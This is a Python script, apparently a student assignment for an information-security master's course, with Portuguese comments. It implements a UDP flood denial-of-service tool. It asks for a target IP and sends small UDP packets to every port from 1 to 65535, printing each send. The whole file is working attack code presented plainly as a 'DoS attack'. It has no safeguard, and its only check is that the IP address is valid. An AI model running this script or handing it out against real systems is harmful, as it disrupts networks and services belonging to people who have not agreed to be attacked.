#!/usr/bin/env python3
#
# Mestrado em Engenharia de Segurança da Informação
# Linguangem de programacao Dinamica - LPD - Python - Prof. Armando Ventura
# Aluno: Lino Silva - 26714
# Módulo: udpflood.py - Faz ataque DoS via UDP para um IP selecionado.
# Exibe o resultao na tela
# Criado em 06/02/2026
# Historio de modificacoes:
# 06/02/2026 - 
#

import socket
import random
import time
import ipaddress
import sys

def udpdos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #cria o socket
    bytes = random.randint(0, 65000).to_bytes(2, byteorder='big')  #cria o pacote
    print("Vamos iniciar  um ataque DOS")
    ip = input("IP de destino: ")  
    try:
        ipaddress.ip_address(ip)
        print("IP valido, vamos iniciar..:")
    except ValueError:
        print("IP invalido!")
        sys.exit()
    sent = 0
    # Loop para envio de pacotes até parar a aplicacao
    try:
        for i in range(1, 65536):
            port = i
            sock.sendto(bytes, (ip, port))
            print("Enviado %s pacotes para %s na porta %s" % (sent, ip, port))
            sent = sent + 1
            time.sleep(0.0005)  # aguarda x segundos entre cada pacote
    except KeyboardInterrupt:
        print("Termino ataque! ")
        sys.exit()
    except socket.gaierror:
        print("Nao foi possivel resolver o IP")
        sys.exit()
    except socket.error:
        print("IP nao responde!")
        sys.exit()
def run():
   udpdos()
